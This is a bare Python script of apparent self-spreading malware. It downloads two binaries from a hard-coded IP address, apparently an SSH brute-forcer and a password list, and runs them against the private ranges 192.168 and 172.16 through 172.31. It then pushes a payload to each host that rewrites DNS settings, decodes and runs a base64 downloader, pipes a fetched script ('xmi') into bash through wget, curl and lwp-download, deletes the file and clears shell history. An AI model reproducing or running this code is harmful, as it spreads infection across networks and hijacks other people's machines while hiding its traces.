import urllib
import platform
import os

payload = 'echo "nameserver 8.8.8.8" > /etc/resolv.conf; echo "cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn" | base64 -d | bash -; wget -q -O - http://205.185.113.151/xmi | bash -sh; curl -fsSL http://205.185.113.151/xmi | bash -sh; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi; history -c'
if platform.architecture()[0] == "64bit":
	urlx64 = "http://205.185.113.151/hxx"
	urlxx = "http://205.185.113.151/ps"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/hxx", "wb") as code:
				code.write(data)
		xx = urllib.urlopen(urlxx)
		if f.code == 200:
			data = xx.read()
			with open ("/tmp/ps", "wb") as code:
				code.write(data)
		os.chmod("/tmp/hxx", 0o777)
		os.chmod("/tmp/p", 0o777)
		os.system("cd /tmp")
		os.system("nohup /tmp/hxx 300 -b 192.168 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.16 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.17 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.18 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.19 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.20 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.21 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.22 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.23 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.24 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.25 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.26 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.27 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.28 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.29 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.30 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.31 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")

	except:
		pass
else:
	urlx32 = "http://205.185.113.151/hxx"
	urlyy = "http://205.185.113.151/ps"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/hxx", "wb") as code:
				code.write(data)
		yy = urllib.urlopen(urlyy)
		if f.code == 200:
			data = yy.read()
			with open ("/tmp/ps", "wb") as code:
				code.write(data)
		os.chmod("/tmp/hxx", 0o777)
		os.chmod("/tmp/ps", 0o777)
		os.system("nohup /tmp/hxx 300 -b 192.168 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.16 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.17 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.18 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.19 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.20 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.21 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.22 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.23 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.24 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.25 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.26 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.27 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.28 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.29 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.30 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("nohup /tmp/hxx 300 -b 172.31 /tmp/ps 22 " + "'" + payload + "'" + ">/dev/null 2>&1")
		os.system("echo Finished")
		os.system("pkill -9 hxx")

	except:
		pass
